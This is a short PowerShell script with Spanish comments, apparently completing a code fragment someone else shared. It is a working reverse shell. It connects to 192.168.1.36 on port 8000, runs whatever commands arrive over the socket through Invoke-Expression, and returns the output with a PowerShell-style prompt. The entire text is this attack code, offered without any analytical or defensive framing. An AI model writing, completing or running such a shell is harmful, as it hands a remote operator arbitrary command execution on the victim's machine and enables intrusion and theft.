# --- ESTA ES LA PARTE QUE FALTA ---
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.36', 8000)
$stream = $client.GetStream()
$buffer = New-Object byte[] 1024
# ----------------------------------

# Aquí es donde empieza el bloque que tú compartiste
while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytes)
    $output = (Invoke-Expression $cmd 2>&1 | Out-String)
    $prompt = "PS " + (Get-Location).Path + "> "
    $response = $output + $prompt
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($response)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
